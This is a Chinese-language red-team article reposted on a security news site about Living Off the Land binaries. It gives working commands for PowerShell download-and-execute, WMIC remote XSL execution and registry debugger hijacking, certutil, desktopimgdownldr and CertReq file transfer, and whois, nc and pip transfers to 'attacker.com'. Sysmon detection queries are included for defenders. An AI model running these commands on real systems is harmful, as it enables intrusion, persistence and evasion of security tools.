# 浅谈Living Off the Land Binaries

阅读量 **270898**

发布时间 : 2020-11-20 16:00:49

 **x**

##### 译文声明

本文是翻译文章，文章原作者 酒仙桥6号部队，文章来源：酒仙桥6号部队

原文地址：[https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1](https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1)

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p2.ssl.qhimg.com/t011035ad640b3d075f.jpg)

## 什么是Living off the land Binaries？

Living off the land Binaries简称LoLbins。Living off the land
是由ChristopherCampbell和MattGraeber提出的。Lolbins为二进制文件。攻击方可以通过该二进制文件执行超出其本身功能的工作。

![](https://p0.ssl.qhimg.com/t014fcdf56124fd0a8f.gif)

这个下载二进制文件还要你讲？和我自己做的C2下载文件有啥区别！大佬别急，听我说。

## LOLbins/lib/script 定义

1.它是操作系统本身文件，或者是从Microsoft下载的文件。总之它必须带有windows自身签名文件。

2.由于是windows自身签名文件，所以一般天然带有免杀的属性,能通过很多应用程序的白名单。

3.它具有APT功能或者一些对我们红队有用的功能。像去年2019年TA505利用LoLbin和新型后门攻击金融行业。

## LoLbin功能：

1.执行代码

任意代码执行。

通过LOLbins执行其他程序（未带微软签名）或者脚本。

2.代码编译

3.文件操作

正在下载；

上传；

复制。

4.持久性权限维持

利用现有的LOLBins来做权限维持。

持久性（比如通过隐藏数据在AD中，在登录时候启动。）

5.UAC Bypass

6.转储进程内存

7.监控（例如键盘记录器，网络跟踪等等）。

8.逃避/修改日志

9.不需要重定位到文件系统其他位置的DLLinjected/side-loading。

## 常见的下载LoLbins

要说到LOLbins最著名且最常见的是PowerShell以及Windows管理工具WMI还有CertUtil工具。讲download为主的lolbin。

PowerShell：

Windows PowerShell 是一种命令行外壳程序和脚本环境，使命令行用户和脚本编写者可以利用.NETFramework的强大功能。

在服务器上设置一个打开计算器的ps脚本。

远程下载命令：

    
    
    (New-Object Net.WebClient).DownloadString("http://xx.xx.xx.xx /test.ps1")

远程下载&执行命令：

    
    
    Invoke-Expression (New-Object
    Net.WebClient).DownloadString("http://xxx.xx.xx.xx/test.ps1")

![](https://p4.ssl.qhimg.com/t016c17b2db42e56206.png)

WMI：

WMIC扩展WMI，提供了从命令行接口和批命令脚本执行系统管理的支持。

服务器上远程放xsl文件：

![](https://p1.ssl.qhimg.com/t01769de9120afccb33.png)

远程下载执行命令：

    
    
    os get /format:"http://xx.xx.xx.xxx/test2.xsl"

![](https://p5.ssl.qhimg.com/t013046cda29a569efb.png)

绑定程序运行（当test.exe运行时，cmd.exe也将运行）：

    
    
    wmic.exe process call create "C:\\Windows\\system32\\reg.exe add
    
    \\\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File
    
    Execution
    
    Options\\test.exe\\" /v \\"Debugger\\" /t REG_SZ /d \\"cmd.exe\\"/
    f"

当然还有之前比较火的无文件wmic后门等等。。。。

CertUtil

CertUtil.exe是Microsoft旨在用于处理证书颁发机构（CA）数据和组件的管理命令行工具。这包括验证证书和证书链，转储和显示CA配置信息以及配置证书服务。

路径:

    
    
    C:\Windows\System32\certutil.exe
    
    C:\Windows\SysWOW64\certutil.exe

下载命令：

    
    
    certutil.exe -urlcache -f UrlAddress Output-File-Name.txt

![](https://p5.ssl.qhimg.com/t01f34528ef7e0f91c9.png)

远程下载并隐藏在ADS数据流中:

    
    
    certutil.exe -urlcache -split -f https://xx.xx.xx.xx/xx c:\\temp:ttt

![](https://p3.ssl.qhimg.com/t012a09e50971195584.png)

![](https://p0.ssl.qhimg.com/t01305fcd847b0464c8.png)

这三者大部分已经能大多数AV,EDR等等识别。。。

![](https://p5.ssl.qhimg.com/t01b314c49704675f10.png)

所以我们需要新的LOLbin来执行我们的要达到的效果。

## 新型下载LOLBIN

Desktopimgdownldr.exe功能

用于设置锁定屏幕或桌面背景图像作为个性化CSP一部分.CSP在WIN10 1703之后引入。

![](https://p4.ssl.qhimg.com/t0123fe4a529af30e4c.png)

用户如果没有用过CSP，那么路径不存在。

    
    
    C:\Windows\Personalization

默认图片下载和存放路径：

    
    
    C:\windows\Personalization\LockScreenImage\LockScreenImage_%random%.jpg

Desktopimgdownldr默认用法：

    
    
    desktopimgdownldr /lockscreenurl:https://domain.com:8080/file.exe /
    eventName：randomname

用法

管理员运行，该文件会设置并覆盖用户锁定的屏幕图像，并生成注册表，我们需要将其注册表删除，避免将其屏幕覆盖。

    
    
    set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
    /lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 && reg delete
    HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP
    /f

注册表路径：

    
    
    \HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP

由于二进制文件desktopimgdownldr中的FunctionSHExpandEnvironmentStringsW使用硬编码地址，所以非管理员也能使用，而且无需注册表。

    
    
    %systemroot%\Personalization\LockScreenImage

普通用户运行：

    
    
    set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe
    /lockscreenurl: https://xx.xx.xx.xx/xxx.ps1 /eventName:desktopimgdownldr

Debug

个人进行尝试的时候，发现普通用户执行命令不能成功执行命令。

管理员执行成功了。同时生成了注册表。

    
    
    C:\Windows\system32>desktopimgdownldr
    /lockscreenurl:http://xx.xxx.xx.xx/test.ps1 /eventName:randomname

![](https://p0.ssl.qhimg.com/t01aec2b6bc79f41db9.png)

![](https://p3.ssl.qhimg.com/t01c3e6c9239eb8cbf8.png)

我的机器环境使用了COM +注册目录。因为修改了%systemroot%目录导致文件找不到它。

    
    
    mklink /J "%TEMP%\Registration" C:\windows\Registration && set
    "SYSTEMROOT=%TEMP%" && cmd /c desktopimgdownldr.exe
    /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr &
    rmdir /s /q "%TEMP%\Registration"

重新建立软连接后可以在普通用户下成功运行。

![](https://p4.ssl.qhimg.com/t01b708845cf66cd01d.png)

有意思的是我用ProcessMonitor发现与之通信的是svhosts而不是desktopimgdownldrPM过滤后筛选出来desktopimgdownldr却没有任何网络流量。

![](https://p0.ssl.qhimg.com/t01d20e696fe98f1050.png)

![](https://p5.ssl.qhimg.com/t011177425d00e215dd.png)

筛选出svchost的网络流量，确实是svchost与服务器通信。

![](https://p1.ssl.qhimg.com/t01a86d336fa6d92934.png)

wireshark跟踪tcp流信息。

![](https://p2.ssl.qhimg.com/t019373f1ac57858c9e.png)

建议

在sysmon中对其监控：

    
    
    Event| where Source == "Microsoft-Windows-Sysmon"| where RenderedDescription
    has "desktopimgdownldr.exe"| extend a = parse_xml(EventData)| extend
    CommandLine =
    tostring(parse_json(tostring(parse_json(tostring(parse_json(tostring(a.DataItem)).EventData)).Data))[10].["#text"])|
    project TimeGenerated, CommandLine, Computer, EventData, RenderedDescription,
    UserName
    
    | sort by TimeGenerated desc

## CertReq

功能

certreq命令可用于从证书颁发机构（CA）请求证书，从CA检索对先前请求的响应，从.inf文件创建新请求，接受并安装对请求的响应，根据现有的CA证书或请求构造交叉认证或合格的从属请求，并签署交叉认证或合格的从属请求。
原本用于帮助windows进行证书认证。还能够作为上传，下载的重要工具。

![](https://p5.ssl.qhimg.com/t01d9cb077caef1cb0d.png)

用法

上传请求：

    
    
    CertReq -Post -config https://example.org/ c:\windows\win.ini

下载POST请求，并显示内容（支持HTTP与HTTPS）：

    
    
    CertReq -Post -config https://example.org/ c:\windows\win.ini

下载POST请求，并保存到本地（支持HTTP与HTTPS）：

    
    
    CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt

Debug

个人测试的时候小文件是可以直接下载，估计50多kb左右，大文件会报错。

小文件：

![](https://p5.ssl.qhimg.com/t0179f4650d065eae52.png)

大文件：

![](https://p3.ssl.qhimg.com/t01b1b14df688454ae5.png)

建议

在sysmon中对其进行监控其中的json内容：

    
    
    Event| where Source == "Microsoft-Windows-Sysmon" and RenderedDescription has
    "OriginalFileName: CertReq.exe"| extend EventFullData = parse_xml(EventData)|
    parse EventData with * 'OriginalFileName">'OriginalFileName '</Data>'*|
    parse EventData with * 'CommandLine">'Commandline '</Data>'*| project
    TimeGenerated, OriginalFileName, Commandline, Computer, EventID, UserName,
    EventFullData
    
    | sort by TimeGenerated desc

## Unix-GTFOBins

windows有LOLbins，Unix下当然也有。

whois用法

攻击机器监听

    
    
    nc -l -p 12345 < "file_to_send"

靶机

    
    
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    whois -h $RHOST -p $RPORT > "$LFILE"

![](https://p2.ssl.qhimg.com/t0112d44980cbec3f22.png)

同理也能传递二进制文件，进行base64位编码。

    
    
    base64 "file_to_send" | nc -l -p 12345
    RHOST=attacker.com
    RPORT=12345
    LFILE=file_to_save
    whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"

PIP用法

利用php install来下载文件。

    
    
    export URL=http://attacker.com/file_to_get
    export LFILE=/tmp/file_to_save
    TF=$(mktemp -d)
    echo 'import sys; from os import environ as e
    if sys.version_info.major == 3: import urllib.request as r
    else: import urllib as r
    r.urlretrieve(e["URL"], e["LFILE"])' > $TF/setup.py
    pip install $TF

![](https://p4.ssl.qhimg.com/t011eb86eb5f0821b1c.png)

![](https://p0.ssl.qhimg.com/t0130f58e0dd124e805.png)

## 总结

LOLbins在实际攻击中除了上面说的下载功能，往往还有很多功能。比如REVERSESHELL,Sudo，SUID，Execute，其中某些bins在AWLpypass有奇效。在红队行动和APT攻击上有着不可忽视的作用。

参考链接：

    
    
    https://lolbas-project.github.io/
    https://github.com/LOLBAS-Project/LOLBAS
    
    
    > [Living Off Windows Land – A New Native File “downldr”](https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/)
    
    
    https://docs.microsoft.com/en-us/windows/win32/cossdk/the-com--catalog
    https://github.com/WojciechLesicki/TH/blob/master/KQL-queries.txt
    https://gtfobins.github.io/

本文翻译自酒仙桥6号部队
[原文链接](https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **酒仙桥六号部队** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/223232](/post/id/223232)

安全客 - 有思想的安全新媒体

本文转载自:
[酒仙桥6号部队](https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1)

如若转载,请注明出处：
[https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1](https://mp.weixin.qq.com/s?src=11&timestamp=1605858435&ver=2717&signature=iMr6flPn1NZQu3VCgtn8hLYDedufnaDAJn-QdKvPtZgtUQRotqvLC4TZzSzOlF-ik--Z0ReyNSbb6KhsnUUo0yzjZGqv7qdayi6i7RP6ADeiPFE9sZC0vrTE71xPwVq*&new=1)

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [渗透测试](/tag/渗透测试)

 **+1** __2赞

 __收藏

![](https://p3.ssl.qhimg.com/t0110bc5d794d277012.png) 酒仙桥六号部队

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

